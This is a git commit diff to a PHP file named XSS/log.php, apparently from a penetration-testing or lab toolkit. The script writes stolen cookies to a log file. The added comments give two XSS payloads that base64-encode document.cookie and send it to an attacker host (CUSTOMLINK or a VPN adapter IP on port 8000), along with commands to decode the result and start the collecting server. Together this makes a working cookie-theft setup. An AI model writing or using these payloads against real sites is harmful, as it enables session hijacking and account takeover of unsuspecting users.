ff162f73c0709ae365cdb63245b373160c3ed365
sa1t <68617409+laqkracha@users.noreply.github.com>
2024-05-15 13:21:26 -0600

    Update log.php

--- XSS/log.php
+++ XSS/log.php
@@ -1,6 +1,12 @@
 <?php
+
+# Examples to call
+# <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>HEEEEEY</h1>
+# <script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
+# then just echo "<content>" | base64 -d
+# setup server: php -S 0.0.0.0:<port>
 $logFile = "cookieLog.txt";
-$cookie = $_REQUEST["c"];
+$cookie = $_REQUEST["cookie"];
 
 $handle = fopen($logFile, "a");
 fwrite($handle, $cookie . "\n\n");
